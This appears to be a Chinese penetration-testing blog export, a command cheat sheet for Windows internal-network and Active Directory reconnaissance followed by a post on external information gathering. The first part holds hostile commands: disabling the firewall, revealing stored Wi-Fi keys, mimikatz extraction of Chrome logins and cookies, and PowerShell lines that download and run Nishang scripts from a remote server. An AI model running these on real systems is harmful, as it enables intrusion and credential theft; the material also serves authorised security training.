<h4 id="3-网络信息收集"><a href="#3-网络信息收集" class="headerlink" title="3.  网络信息收集"></a>3.  网络信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat -anob</span><br><span class="line"></span><br><span class="line">#查看路由表和arp缓存</span><br><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">#查看本机共享列表和可访问的域共享列表 （<span class="number">445</span>端口）</span><br><span class="line"><span class="built_in">net</span> share</span><br><span class="line">wmic share get name,<span class="built_in">path</span>,status</span><br><span class="line"></span><br><span class="line">#磁盘映射</span><br><span class="line"><span class="built_in">net</span> use k: \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">10</span>\c$</span><br></pre></td></tr></table></figure>

<h4 id="4-防火墙信息收集"><a href="#4-防火墙信息收集" class="headerlink" title="4.  防火墙信息收集"></a>4.  防火墙信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以前的版本)</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable</span><br><span class="line"></span><br><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以后的版本)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"></span><br><span class="line">#查看防火墙配置(netsh命令也可以用作端口转发)</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line">#查看配置规则</span><br><span class="line">netsh advfirewall firewall show rule name=all</span><br></pre></td></tr></table></figure>

<h4 id="5-代理信息收集"><a href="#5-代理信息收集" class="headerlink" title="5.  代理信息收集"></a>5.  代理信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">ProxyServer</span><br><span class="line"></span><br><span class="line">#通过pac文件自动代理情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">AutoConfigURL</span><br></pre></td></tr></table></figure>

<h4 id="6-其他信息收集"><a href="#6-其他信息收集" class="headerlink" title="6.  其他信息收集"></a>6.  其他信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#wifi密码</span><br><span class="line">netsh wlan show profile</span><br><span class="line">netsh wlan show profile name=&quot;EEFUNG&quot; key=clear</span><br><span class="line"></span><br><span class="line">#回收站内容获取</span><br><span class="line"><span class="keyword">FOR</span> /f &quot;skip=<span class="number">1</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims= &quot; %c <span class="keyword">in</span> (&#x27;wmic useraccount get name^,sid&#x27;) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b</span><br><span class="line"><span class="function">C:\$<span class="title">Recycle.Bin</span>\%<span class="title">d</span>\ ^&gt;%<span class="title">c.txt</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">C</span>:\$<span class="title">Recycle.Bin</span>\<span class="title">S</span>-1-5-21-3845785564-1101086751-683477353-1001\</span></span><br><span class="line"><span class="function">#$<span class="title">I</span> 开头的文件保存的是路径信息</span></span><br><span class="line"><span class="function">#$<span class="title">R</span> 开头的文件保存的是文件内容</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#<span class="title">Chrome</span>历史记录和<span class="title">Cookie</span>获取</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">LOGIND</span>~1</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span></span></span><br><span class="line"><span class="function">#<span class="title">chrome</span>的用户信息，保存在本地文件为<span class="title">sqlite</span> 数据库格式</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">LOGIND</span>~1&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span> /<span class="title">unprotect</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>

<h6 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h6><p>Nishang-Gather-Get-Information.ps1</p>
<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</a></p>
<p>脚本上传至VPS，开启HTTP让目标机器执行命令访问请求脚本</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://ip:port/GetInformation.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure>

<h6 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#scraper</span><br><span class="line">Meterpreter &gt; run scraper</span><br><span class="line">/root/.msf4/logs/scripts/scraper</span><br><span class="line"></span><br><span class="line">#winenum</span><br><span class="line">Meterpreter &gt; run winenum</span><br><span class="line">/root/.msf4/logs/scripts/winenum</span><br></pre></td></tr></table></figure>



<h2 id="0x03-域内信息收集"><a href="#0x03-域内信息收集" class="headerlink" title="0x03  域内信息收集"></a>0x03  域内信息收集</h2><h4 id="1-Net组件"><a href="#1-Net组件" class="headerlink" title="1.  Net组件"></a>1.  Net组件</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查询域</span><br><span class="line"><span class="built_in">net</span> view /domain</span><br><span class="line"></span><br><span class="line">#查询域内的所有计算机</span><br><span class="line"><span class="built_in">net</span> view /domain:de1ay</span><br><span class="line"></span><br><span class="line">#查询域内所有用户组（Enterprise Admins组权限最大）</span><br><span class="line"><span class="built_in">net</span> group /domain</span><br><span class="line"></span><br><span class="line">#查看域管理员的用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询所有域成员计算机列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询域系统管理员用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查看域控制器</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line">#对比查看&quot;工作站域DNS名称(域名)&quot;和&quot;登录域()域控制器&quot;的信息是否相匹配</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#查看域内所有账号</span><br><span class="line"><span class="built_in">net</span> user /domain</span><br><span class="line"></span><br><span class="line">#查询指定用户的详情信息</span><br><span class="line"><span class="built_in">net</span> user xxx /domain</span><br><span class="line"></span><br><span class="line">#查看时间可以找到域控</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line">#查看域密码策略</span><br><span class="line"><span class="built_in">net</span> accounts /domain</span><br><span class="line"></span><br><span class="line">#查看当前登录域</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#登录本机的域管理员</span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain</span><br></pre></td></tr></table></figure>

<h4 id="2-dsquery"><a href="#2-dsquery" class="headerlink" title="2.  dsquery"></a>2.  dsquery</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">#查看当前域中的所有账户名</span><br><span class="line">dsquery user</span><br><span class="line"></span><br><span class="line">#查看当前域内的所有组名</span><br><span class="line">dsquery group</span><br><span class="line"></span><br><span class="line">#查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery subnet</span><br><span class="line"></span><br><span class="line">#查看域内所有的web站点</span><br><span class="line">dsquery site</span><br><span class="line"></span><br><span class="line">#查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery server</span><br><span class="line"></span><br><span class="line">#查询前<span class="number">240</span>个以admin开头的用户名</span><br><span class="line">dsquery user domainroot -name admin* -limit <span class="number">240</span></span><br></pre></td></tr></table></figure>

<h4 id="3-定位域控"><a href="#3-定位域控" class="headerlink" title="3.  定位域控"></a>3.  定位域控</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">ipconfig</span></span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询dns解析记录</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.de1ay.com</span><br><span class="line"></span><br><span class="line">#spn扫描</span><br><span class="line">#在SPN扫描结果中可以通过如下内容，来进行域控的定位。</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -T de1ay.com -q */*</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=de1ay,DC=com</span><br><span class="line"></span><br><span class="line">#<span class="built_in">net</span> group</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>

<h6 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h6><p>端口：389 </p>
<p>服务：LDAP、ILS </p>
<p>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
<p>端口：53 </p>
<p>服务：Domain Name Server（DNS） </p>
<p>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT 系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
<h4 id="4-Other"><a href="#4-Other" class="headerlink" title="4.  Other"></a>4.  Other</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看域内信任关系</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line">#查看域控制器的机器名</span><br><span class="line">nltest /DCLIST:de1ay</span><br><span class="line"></span><br><span class="line">#查看域内邮件服务器</span><br><span class="line">nslookup -q=mx de1ay.com</span><br><span class="line"></span><br><span class="line">#查看域内DNS服务器</span><br><span class="line">nslookup -q=ns de1ay.com</span><br></pre></td></tr></table></figure>



<h2 id="0x04-内网存活探测"><a href="#0x04-内网存活探测" class="headerlink" title="0x04  内网存活探测"></a>0x04  内网存活探测</h2><h4 id="1-Netbios协议探测"><a href="#1-Netbios协议探测" class="headerlink" title="1.  Netbios协议探测"></a>1.  Netbios协议探测</h4><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接 口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统 可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名 称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源 的共享</p>
<h6 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sU -T4 --script nbstat.nse -p137 <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h6 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>

<h6 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h6><p>项目地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a> </p>
<p>使用nbtscan扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器 输出的结果第一列为IP地址，第二列为机器名和所在域的名称，第三列即最后一列为及其所开启的服务的列表</p>
<h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nbtscan.exe –m <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">nbtstat –n</span><br></pre></td></tr></table></figure>

<h6 id="Lunix"><a href="#Lunix" class="headerlink" title="Lunix"></a>Lunix</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nbtscan -r <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h4 id="2-ICMP协议探测"><a href="#2-ICMP协议探测" class="headerlink" title="2.  ICMP协议探测"></a>2.  ICMP协议探测</h4><p>ICMP是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否 可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要 的作用。</p>
<h6 id="nmap扫描-1"><a href="#nmap扫描-1" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sn -PE -T4 <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">#  -sn: <span class="built_in">Ping</span> Scan - disable port scan</span><br><span class="line">#  -PE: ICMP <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>

<h4 id="3-UDP协议探测"><a href="#3-UDP协议探测" class="headerlink" title="3.  UDP协议探测"></a>3.  UDP协议探测</h4><p>UDP是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供 数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
<h6 id="nmap扫描-2"><a href="#nmap扫描-2" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sU –T4 -sV --max-retries <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> -p <span class="number">500</span></span><br></pre></td></tr></table></figure>

<h6 id="msf扫描-1"><a href="#msf扫描-1" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>

<h4 id="4-ARP协议探测"><a href="#4-ARP协议探测" class="headerlink" title="4.  ARP协议探测"></a>4.  ARP协议探测</h4><p>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取 物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回 消息，以此确定目标的物理地址</p>
<h6 id="nmap扫描-3"><a href="#nmap扫描-3" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sn -PR <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h6 id="msf扫描-2"><a href="#msf扫描-2" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>

<h4 id="5-SMB协议探测"><a href="#5-SMB协议探测" class="headerlink" title="5.  SMB协议探测"></a>5.  SMB协议探测</h4><h6 id="msf扫描-3"><a href="#msf扫描-3" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>

<h4 id="6-端口探测"><a href="#6-端口探测" class="headerlink" title="6.  端口探测"></a>6.  端口探测</h4><p>MSF中的portscan模块 </p>
<p>nmap </p>
<p>Nishang中的Invoke-PortScan模块 端口扫描，默认扫描常见端口，也可以用 -Port指定端口： </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.<span class="number">104</span>.<span class="number">255</span>.<span class="number">11</span>:<span class="number">8000</span>/Invoke-PortScan.ps1&#x27;);InvokePortScan -StartAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">1</span> -EndAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">255</span> -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2021/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><hr>
<h3 id="0x00-什么是信息收集"><a href="#0x00-什么是信息收集" class="headerlink" title="0x00 什么是信息收集"></a>0x00 什么是信息收集</h3><p>​    信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。比如目标站点IP、中间件、脚本语言、端口、邮箱等等。信息收集包含资产收集但不限于资产收集。</p>
<span id="more"></span>

<h3 id="0x01-信息收集的分类"><a href="#0x01-信息收集的分类" class="headerlink" title="0x01 信息收集的分类"></a>0x01 信息收集的分类</h3><p>信息收集的方式可以分为两种：主动和被动。</p>
<ul>
<li>主动信息收集：通过直接访问在网站上进行操作，对网站进行扫描等，这种是有网络流量经过目标服务器得信息收集方式</li>
<li>被动信息收集：基于公开的渠道，比如搜索引擎等在不与目标系统直接交互得情况下获取信息，并且尽量避免留下痕迹，比例：Google搜索、Shodan搜索等</li>
</ul>
<p>没有一种方式是最完美的，每个方式都有自己的优势，主动方式，能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，收集的信息会相对较少，但是收集信息得行动并不会被目标主机发现。一个渗透项目下，需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p>
<h5 id="常见搜集的信息包括"><a href="#常见搜集的信息包括" class="headerlink" title="常见搜集的信息包括"></a>常见搜集的信息包括</h5><blockquote>
<ol>
<li>IP地址信息（服务、端口、协议、CDN）</li>
<li>域名信息（whois、备案信息（邮箱、联系人、地址、电话）、子域名）</li>
<li>网站信息（框架、服务器、数据库、编程语言、指纹、WAF、敏感文件、C段、敏感目录、源码泄露、旁站）</li>
<li>DNS记录</li>
<li>管理员信息（姓名、职务、生日、联系电话、邮件地址）</li>
</ol>
</blockquote>
<h3 id="0x02-域名信息的收集"><a href="#0x02-域名信息的收集" class="headerlink" title="0x02 域名信息的收集"></a>0x02 域名信息的收集</h3><h4 id="1-域名介绍"><a href="#1-域名介绍" class="headerlink" title="1.域名介绍"></a>1.域名介绍</h4><p><strong>域名</strong>（Domain Name),简称域名、网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br><strong>DNS</strong>(域名系统，Domain Name System)是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p>
<p><img src="/2021/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
<h4 id="2-Whois"><a href="#2-Whois" class="headerlink" title="2. Whois"></a>2. Whois</h4><p>​    Whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，Whois就是一个用来查询域名是否已经被注册，以及注册域名信息的数据库（如域名所有人、域名注册商、注册商邮箱等）。<br>​    通过Whois查询可以获得域名注册者邮箱地址等信息，一般情况下对于中小型网站域名注册者就是网站管理员，利用搜索引擎对Whois查询到的信息进行搜索，获取更多域名注册者的个人信息。</p>
<h5 id="1-web接口查询"><a href="#1-web接口查询" class="headerlink" title="(1) web接口查询"></a>(1) web接口查询</h5><p>常见的信息收集网站包括：</p>
<ul>
<li>Whois站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
<li>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>阿里云中国万网：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></li>
<li>Whois Lookup查找目标网站所有者信息：<a href="http://whois.domaintools.com/">http://whois.domaintools.com/</a></li>
<li>Netcraft Site Report显示目标网站使用的技术：<a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></li>
<li>全球Whois查询：<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></li>
<li>站长工具爱站查询：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></li>
<li>DNS服务器解析：<a href="http://tool.chinaz.com/nslookup">http://tool.chinaz.com/nslookup</a></li>
<li>多地ping 检查dns是否存在：<a href="http://ping.chinaz.com/ping.chinaz.com">http://ping.chinaz.com/ping.chinaz.com</a></li>
<li>同ip查旁站：<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></li>
</ul>
<h5 id="2-通过Whois命令查询"><a href="#2-通过Whois命令查询" class="headerlink" title="(2) 通过Whois命令查询"></a>(2) 通过Whois命令查询</h5><p>在Kali Linux下自带的Whois查询工具，通过命令Whois查询域名信息。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Whois baidu.com</span><br></pre></td></tr></table></figure>

<h5 id="3-Python撰写Whois代码"><a href="#3-Python撰写Whois代码" class="headerlink" title="(3) Python撰写Whois代码"></a>(3) Python撰写Whois代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="number">2.</span> req_whois = urllib.request.urlopen(<span class="string">&#x27;http://whois.chinaz.com/doucube.com&#x27;</span>)</span><br><span class="line"><span class="number">3.</span> print(req_whois.read().decode())</span><br><span class="line"><span class="number">4.</span> </span><br><span class="line"><span class="number">5.</span> <span class="keyword">import</span> whois</span><br><span class="line"><span class="number">6.</span> data = whois.whois(<span class="string">&quot;sohu.com&quot;</span>)</span><br><span class="line"><span class="number">7.</span> print(data)</span><br></pre></td></tr></table></figure>

<h4 id="3-备案信息"><a href="#3-备案信息" class="headerlink" title="3.备案信息"></a>3.备案信息</h4><p>​    ICP备案是指网络内容提供商（Internet Content Provider），《互联网信息服务管理办法》指出需要对网站进行备案，未取得许可不得从事互联网信息服务。</p>
<ul>
<li>ICP站长之家：<a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></li>
<li>天眼查： <a href="http://www.tianyancha.com/">http://www.tianyancha.com</a> </li>
</ul>
<h4 id="4-子域名"><a href="#4-子域名" class="headerlink" title="4.子域名"></a>4.子域名</h4><p>​    子域名指二级域名，二级域名是顶级域名（一级域名）的下一级。比如mail.heetian.com和bbs.heetian.com是heetian.com的子域，而heetian.com<br>则是顶级域名.com的子域。</p>
<h5 id="1-Google-Hack"><a href="#1-Google-Hack" class="headerlink" title="(1) Google Hack"></a>(1) Google Hack</h5><p>​    Google Hack是指使用Google、百度等搜索引擎对某些特定网站主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>指定搜索域名                                                                    例如：site:hetianlab.com</td>
</tr>
<tr>
<td>inurl</td>
<td>指定url中是否存在某些关键字                                        例如：inurl : php?id=</td>
</tr>
<tr>
<td>intext</td>
<td>指定网页中是否存在某些关键字                                     例如：intext:网站管理</td>
</tr>
<tr>
<td>filetype</td>
<td>指定搜索文件类型                                                             例如：filetype:txt</td>
</tr>
<tr>
<td>intitle</td>
<td>指定网页标题是否存在某些关键字                                  例如：后台管理</td>
</tr>
<tr>
<td>link</td>
<td>指定网页链接                                                                     例如：link:hetianlab.com 指定与合天做了外链得站点</td>
</tr>
<tr>
<td>info</td>
<td>指定搜索网页信息                                                              例如： info:hetianlabcom</td>
</tr>
</tbody></table>
<h5 id="2-第三方web接口查询"><a href="#2-第三方web接口查询" class="headerlink" title="(2) 第三方web接口查询"></a>(2) 第三方web接口查询</h5><ul>
<li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
<li><a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a></li>
<li><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li>
</ul>
<h5 id="3-网络空间安全搜索引擎"><a href="#3-网络空间安全搜索引擎" class="headerlink" title="(3) 网络空间安全搜索引擎"></a>(3) 网络空间安全搜索引擎</h5><ul>
<li>FoFa         <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li>
<li>钟馗之眼  <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li>
<li>Shodan    <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li>
</ul>
<h5 id="4-SSL证书查询"><a href="#4-SSL证书查询" class="headerlink" title="(4) SSL证书查询"></a>(4) SSL证书查询</h5><ul>
<li><p><a href="https://crt.sh/">https://crt.sh/</a></p>
</li>
<li><p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p>
</li>
</ul>
<h5 id="5-工具"><a href="#5-工具" class="headerlink" title="(5) 工具"></a>(5) 工具</h5><ul>
<li><p>Layer子域名挖掘机</p>
</li>
<li><p>JSFinder                        <a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
</li>
<li><p>OneForAll                     <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
</li>
<li><p>subDomainsBrute      <a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
</li>
</ul>
<h3 id="0x03-IP信息的收集"><a href="#0x03-IP信息的收集" class="headerlink" title="0x03 IP信息的收集"></a>0x03 IP信息的收集</h3><h4 id="1-IP反查域名"><a href="#1-IP反查域名" class="headerlink" title="1. IP反查域名"></a>1. IP反查域名</h4><p>​    如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，因为一台物理服务器上面可能运行多个虚拟主机。这些虚拟主机有不同的域名，但通常共用一个IP地址。如果你知道有哪些网站共用这台服务器，就有可能通过此台服务器上其他网站的漏洞获取服务器控制权，进而迁回获取渗透目标的权限，这种技术也称为“旁注”。</p>
<ul>
<li><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li><a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></li>
</ul>
<h4 id="2-域名查询IP"><a href="#2-域名查询IP" class="headerlink" title="2. 域名查询IP"></a>2. 域名查询IP</h4><p>​    知道一个站点的域名需要得到它的IP以便之后获取端口信息或扫描等后续工作。</p>
<ul>
<li><a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a></li>
</ul>
<h4 id="3-CDN"><a href="#3-CDN" class="headerlink" title="3. CDN"></a>3. CDN</h4><h5 id="1-CDN"><a href="#1-CDN" class="headerlink" title="(1)CDN"></a>(1)CDN</h5><p>​    CDN全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率.其原理如下：某些大型网站在全国都会有很多用户，这些用户常常会向网站发送不同的请求，那么不同地域会具有不同的缓冲服务器来接收用户发送的流量。如果用户发送流量没有任何交互的数据，只是请求首页的话，此时根据用户所在地区来确定访问的高速缓存服务器，高速缓存服务器会返回对应的响应到用户的浏览器当中，比如广东。</p>
<p><img src="/2021/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.png"></p>
<p>​    当用户填写数据，需要交互时才会将请求发送到真实的服务器；此时通过广东省的缓存服务器来连接真实服务器。</p>
<h5 id="2-判断CDN"><a href="#2-判断CDN" class="headerlink" title="(2)判断CDN"></a>(2)判断CDN</h5><p>​    可以通过Ping来判断网站是否存在CDN，比如 <a href="http://www.xxxx.com/">http://www.xxxx.com/</a> 。显示如下图所示，可以看到该网站是存在CDN的。</p>
<p><img src="/2021/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png"></p>
